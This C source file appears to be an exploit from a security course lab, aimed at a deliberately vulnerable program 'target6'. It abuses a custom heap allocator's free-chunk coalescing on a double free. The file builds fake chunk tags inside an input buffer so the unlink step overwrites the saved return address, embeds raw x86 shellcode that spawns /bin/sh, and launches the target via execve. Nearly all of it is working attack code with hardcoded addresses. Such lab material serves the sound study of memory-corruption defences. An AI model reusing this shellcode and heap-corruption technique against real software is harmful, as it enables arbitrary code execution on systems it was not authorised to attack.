#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <stdint.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"


/*

       <---------------192 bytes----------------->
       <----------80 bytes------>
[tag p]  [SHELLCODE]  [fake tag1]   [fake tag2]     [tag][ free region ...
^     ^               ^         ^
      p pointer                 q pointer

Battle plan:

Assuming both left and right tags are free (freebit is set)
when q is freed for the second time and consolidating neighbours, 
tfree essentially does

chunk = TOCHUNK(q);
chunk->r->l = chunk->l;

We want it to do
*saved_rip_ptr = addr_of_payload_ptr

So we need.

fake_tag1->s.l = & payload
fake_tag1->s.r = & fake_tag2

fake_tag2->s.l = whatever
fake_tag2->s.r = & saved_rip


*/

/********* COPIED FROM tmalloc.c *****************/
/*
 * the chunk header
 */
typedef uint64_t ALIGN;

typedef union CHUNK_TAG
{
  struct
    {
      uint32_t l;       /* leftward chunk */
      uint32_t r;       /* rightward chunk + free bit (see below) */
    } s;
  ALIGN x;
} CHUNK;

/*
 * back or forward chunk header
 */
#define TOCHUNK(vp) (-1 + (CHUNK *)(vp))
#define FROMCHUNK(chunk) ((void *)(1 + (chunk)))

/*
 * we store the freebit -- 1 if the chunk is free, 0 if it is busy --
 * in the low-order bit of the chunk's r pointer.
 */
#define SET_FREEBIT(chunk) ( (chunk)->s.r |= 0x1 )
#define CLR_FREEBIT(chunk) ( (chunk)->s.r &= ~0x1 )
#define GET_FREEBIT(chunk) ( (chunk)->s.r & 0x1 )

/*************************************************/


int main(void)
{
  char *args[3];
  char *env[1];

  // Depends on system.
  const char * p_ptr = (char*)0x104ee28;
  const char * q_ptr = (char*)0x104ee78;

  char exploit[192];
  bzero(exploit, 192);
  

  // The only difference is that the there is some extra NOP between
  // the first jmp and the next non NOP instruction.
  // This space is for one of the fake tags.
  static char newshellcode[] =
  "\xeb\x25\x90\x90\x90\x90\x90\x90\x5e\x89\x76\x08\x31\xc0\x88\x46"
  "\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
  "\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
  strcpy(exploit, newshellcode);


  // Pretend the first 64 bits of exploit str is a CHUNK and set it
  // as free so that 'tfree' will try to coalesce it
  CHUNK *fake_tag0 = (CHUNK*)exploit;
  SET_FREEBIT(fake_tag0);

  // fill the following with NOP
  int len = strlen(exploit);
  memset(&exploit[len], NOP, 192-len);  
  
  // Pretend other parts of exploits are CHUNKs
  CHUNK *fake_tag1 = TOCHUNK(&exploit[80]);
  CHUNK *fake_tag2 = TOCHUNK(&exploit[96]);
  
  
  fake_tag1->s.l = (uint32_t)(uint64_t)p_ptr; // p beginning of shellcode
  fake_tag1->s.r = (uint32_t)(uint64_t)TOCHUNK(q_ptr+16); // offset to fake_tag2

  fake_tag2->s.l = 0xdeadbeef; // value doesn't matter
  fake_tag2->s.r = 0x2021fe38; // &saved rip
  
  // This tag needs to be set as free so that it will get coalesced
  SET_FREEBIT(fake_tag2);
  
  //print_exploit(exploit, 200);
  
  args[0] = TARGET;
  args[1] = exploit;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
